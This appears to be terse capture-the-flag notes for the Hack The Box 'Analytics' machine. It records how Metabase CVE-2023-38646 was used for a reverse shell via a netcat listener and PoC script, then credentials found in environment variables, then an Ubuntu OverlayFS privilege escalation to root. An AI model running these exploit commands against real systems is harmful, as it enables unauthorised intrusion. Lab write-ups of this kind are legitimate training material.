# Analytics 
## recon 

http://data.analytical.htb/
http://analytical.htb/


exploit Metabase 
https://github.com/shamo0/CVE-2023-38646-PoC?source=post_page-----866220684396--------------------------------
http://data.analytical.htb/api/session/properties

"setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"

create listenner 
```
nc -lvnp 9999
```

use POC 
```
python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb/ --lhost 10.10.16.15 --lport 9999
```

env give us ssh user & password for metalytics
META_USER=metalytics
META_PASS=An4lytics_ds20223#

Linux version 
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux

google 25~22.04.2-Ubuntu -> CVE-2023-2640 
use https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh?source=post_page-----8cf81fa970ca--------------------------------

rooted
